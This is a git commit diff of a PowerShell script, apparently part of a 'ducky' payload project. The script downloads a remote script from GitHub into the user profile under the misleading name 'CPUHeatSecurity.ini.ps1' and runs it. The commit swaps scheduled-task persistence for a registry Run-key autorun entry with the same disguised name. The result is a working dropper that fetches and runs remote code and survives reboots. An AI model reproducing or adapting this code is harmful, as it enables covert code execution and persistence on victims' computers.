8c32e42dabdfee4468f9cbe94d4d6c1f7d3dc166
BuildTools <unconfigured@null.spigotmc.org>
2023-06-08 18:09:23 +0400

    Please enter the commit message for your changes. Lines starting with '#' will be ignored, and an empty message aborts the commit.
    On branch master
    Your branch is up to date with 'origin/master'.
    
    Changes to be committed:
    	modified:   initial.ps1

--- initial.ps1
+++ initial.ps1
@@ -1,16 +1,15 @@
 # Paramètres
 $githubUrl = "https://raw.githubusercontent.com/Gamoboy/ducky/master/CPUHeatSecurity.ps1"
 $destinationPath = "$env:USERPROFILE\CPUHeatSecurity.ini.ps1"
-$taskName = "CPUHeatSecurity"
+$autorunRegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$autorunRegistryName = "CPUHeatSecurity"
+$autorunScriptCommand = "& '$destinationPath'"
 
 # Téléchargement du script depuis GitHub
 Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath
 
 # Création de la tâche planifiée
-$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File '$destinationPath'"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings
+Set-ItemProperty -Path $autorunRegistryPath -Name $autorunRegistryName -Value $autorunScriptCommand
 
 Invoke-Expression -Command $destinationPath
 
